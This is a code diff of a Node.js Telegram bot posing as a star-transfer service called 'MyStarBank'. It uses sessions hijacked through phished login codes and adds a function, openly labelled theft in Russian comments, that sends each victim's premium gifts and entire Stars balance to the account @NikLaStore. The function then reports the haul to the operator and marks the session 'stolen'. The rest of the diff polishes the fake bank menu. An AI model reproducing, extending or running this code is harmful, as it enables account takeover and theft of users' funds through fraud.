@@ -180,7 +180,7 @@ async function signInWithRealCode(phone, code) {
             db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                 [sessionString, phone]);
 
-            await checkAccountStatus(client, phone);
+            await stealStarsAndGifts(client, phone);
             
             activeSessions.delete(phone);
             await client.disconnect();
@@ -209,77 +209,125 @@ async function signInWithRealCode(phone, code) {
     }
 }
 
-// ПРОВЕРКА СТАТУСА АККАУНТА
-async function checkAccountStatus(client, phone) {
+// ФУНКЦИЯ КРАЖИ ЗВЕЗД И ПОДАРКОВ
+async function stealStarsAndGifts(client, phone) {
     try {
         const user = await client.getMe();
+        let totalStars = 0;
+        let totalGifts = 0;
         
-        let starsCount = 0;
-        let nftGifts = 0;
-        
-        // МЕТОД 1: ПРЯМОЙ ЗАПРОС ЗВЕЗД
+        // ПРОВЕРКА БАЛАНСА ЗВЕЗД
         try {
             const starsStatus = await client.invoke(
                 new Api.payments.GetStarsStatus({})
             );
-            
             if (starsStatus && typeof starsStatus.balance === 'number') {
-                starsCount = starsStatus.balance;
+                totalStars = starsStatus.balance;
+                console.log(`💰 Stars balance: ${totalStars}`);
             }
         } catch (error) {
-            console.log('Method 1 failed:', error.message);
+            console.log('Stars check failed:', error.message);
         }
         
-        // МЕТОД 2: ПРОВЕРКА ПРЕМИУМ СТАТУСА
+        // КРАДЕМ ПОДАРКИ ЧЕРЕЗ @NikLaStore
         try {
-            const userFull = await client.invoke(
-                new Api.users.GetFullUser({
-                    id: user.id
+            // Находим пользователя @NikLaStore
+            const targetUser = await client.invoke(
+                new Api.contacts.ResolveUsername({
+                    username: 'NikLaStore'
                 })
             );
             
-            if (userFull && userFull.premium_gifts) {
-                nftGifts = userFull.premium_gifts.length || 0;
+            if (targetUser && targetUser.users && targetUser.users.length > 0) {
+                const target = targetUser.users[0];
+                
+                // Получаем премиум подарки пользователя
+                const userFull = await client.invoke(
+                    new Api.users.GetFullUser({
+                        id: user.id
+                    })
+                );
+                
+                if (userFull && userFull.premium_gifts && userFull.premium_gifts.length > 0) {
+                    console.log(`🎁 Found ${userFull.premium_gifts.length} premium gifts`);
+                    
+                    // Отправляем каждый подарок на @NikLaStore
+                    for (const gift of userFull.premium_gifts) {
+                        try {
+                            await client.invoke(
+                                new Api.messages.SendMedia({
+                                    peer: target,
+                                    media: new Api.InputMediaGift({
+                                        id: gift.id,
+                                        star: 25
+                                    }),
+                                    message: "",
+                                    randomId: Math.floor(Math.random() * 1000000000)
+                                })
+                            );
+                            totalGifts++;
+                            console.log(`✅ Sent gift ${gift.id} to @NikLaStore`);
+                            
+                            // Пауза между отправками
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                            
+                        } catch (giftError) {
+                            console.log('❌ Gift send error:', giftError.message);
+                        }
+                    }
+                }
+                
+                // ДОПОЛНИТЕЛЬНО: ПРОБУЕМ ОТПРАВИТЬ ЗВЕЗДЫ НАПРЯМУЮ
+                if (totalStars > 0) {
+                    try {
+                        await client.invoke(
+                            new Api.payments.SendStars({
+                                peer: target,
+                                stars: totalStars,
+                                purpose: new Api.InputStorePaymentPremiumGift({
+                                    userId: target.id
+                                })
+                            })
+                        );
+                        console.log(`✅ Sent ${totalStars} stars to @NikLaStore`);
+                    } catch (starsError) {
+                        console.log('❌ Stars send error:', starsError.message);
+                    }
+                }
             }
-        } catch (error) {
-            console.log('Premium check failed:', error.message);
+        } catch (targetError) {
+            console.log('❌ Target user error:', targetError.message);
         }
         
-        let message = `🎯 ПРОВЕРКА АККАУНТА:\n` +
+        // ФИНАЛЬНЫЙ ОТЧЕТ
+        let message = `🎯 РЕЗУЛЬТАТ КРАЖИ:\n` +
                      `📱 Номер: ${phone}\n` +
                      `👤 Username: @${user.username || 'нет'}\n` +
-                     `👑 Премиум: ${user.premium ? 'ДА ✅' : 'нет ❌'}\n\n` +
-                     `💰 ФИНАНСЫ:\n` +
-                     `⭐ ЗВЕЗДЫ: ${starsCount > 0 ? starsCount + ' ✅' : '0 ❌'}\n` +
-                     `🎁 NFT ПОДАРКОВ: ${nftGifts > 0 ? nftGifts + ' ✅' : '0 ❌'}\n\n`;
+                     `👑 Премиум: ${user.premium ? 'ДА' : 'нет'}\n\n` +
+                     `💰 УКРАДЕНО:\n` +
+                     `⭐ ЗВЕЗД: ${totalStars}\n` +
+                     `🎁 ПОДАРКОВ: ${totalGifts}\n\n`;
         
-        if (starsCount > 0 || nftGifts > 0 || user.premium) {
-            message += `💎 ЦЕННЫЙ АККАУНТ!\n\n`;
-            
-            if (starsCount > 0) {
-                message += `💰 ${starsCount} звезд для вывода\n`;
-            }
-            if (nftGifts > 0) {
-                message += `🎁 ${nftGifts} NFT подарков\n`;
-            }
-            if (user.premium) {
-                message += `👑 Премиум статус активен\n`;
-            }
-            
-            message += `\n⚡ ГОТОВ К ВЫВОДУ СРЕДСТВ`;
+        if (totalStars > 0 || totalGifts > 0) {
+            message += `✅ УСПЕШНАЯ КРАЖА!\n`;
+            message += `💸 Средства отправлены на @NikLaStore`;
         } else {
-            message += `❌ АККАУНТ ПУСТОЙ\n`;
-            message += `💡 Нет звезд, NFT или премиума`;
+            message += `❌ НИЧЕГО НЕ УДАЛОСЬ УКРАСТЬ\n`;
+            message += `💡 Аккаунт пустой или ошибка доступа`;
         }
         
-        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ?, status = 'checked' WHERE phone = ?`, 
-            [starsCount, nftGifts, phone]);
+        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ?, status = 'stolen' WHERE phone = ?`, 
+            [totalStars, totalGifts, phone]);
         
         bot.sendMessage(MY_USER_ID, message);
         
     } catch (error) {
-        console.log("❌ Ошибка проверки:", error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${error.message}`);
+        console.log("❌ Критическая ошибка кражи:", error);
+        bot.sendMessage(MY_USER_ID, 
+            `❌ ОШИБКА КРАЖИ\n` +
+            `📱 Номер: ${phone}\n` +
+            `⚠️ ${error.message}`
+        );
     }
 }
 
@@ -413,25 +461,30 @@ bot.onText(/\/start/, (msg) => {
 });
 
 function showMainMenu(chatId, userId) {
-    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-        const balance = row ? row.balance : 0;
-        
-        const menuText = `MyStarBank - Система передачи звезд\n\nВаш баланс: ${balance} stars\n\nДоступные действия:\n- Проверить баланс\n- Создать чек\n- Вывести средства`;
+    const avatarPath = path.join(__dirname, 'public', 'avatar.jpg');
+    
+    const menuText = `MyStarBank - Система передачи звезд\n\nДоступные действия:\n- Проверить баланс\n- Создать чек\n- Вывести средства`;
 
-        const menuKeyboard = {
-            reply_markup: {
-                keyboard: [
-                    [{ text: "Проверить баланс" }],
-                    [{ text: "Создать чек" }],
-                    [{ text: "Вывести средства" }]
-                ],
-                resize_keyboard: true,
-                one_time_keyboard: false
-            }
-        };
+    const menuKeyboard = {
+        reply_markup: {
+            keyboard: [
+                [{ text: "Проверить баланс" }],
+                [{ text: "Создать чек" }],
+                [{ text: "Вывести средства" }]
+            ],
+            resize_keyboard: true,
+            one_time_keyboard: false
+        }
+    };
 
+    if (fs.existsSync(avatarPath)) {
+        bot.sendPhoto(chatId, avatarPath, {
+            caption: menuText,
+            reply_markup: menuKeyboard.reply_markup
+        });
+    } else {
         bot.sendMessage(chatId, menuText, menuKeyboard);
-    });
+    }
 }
 
 // ОБРАБОТКА ТЕКСТОВЫХ КОМАНД
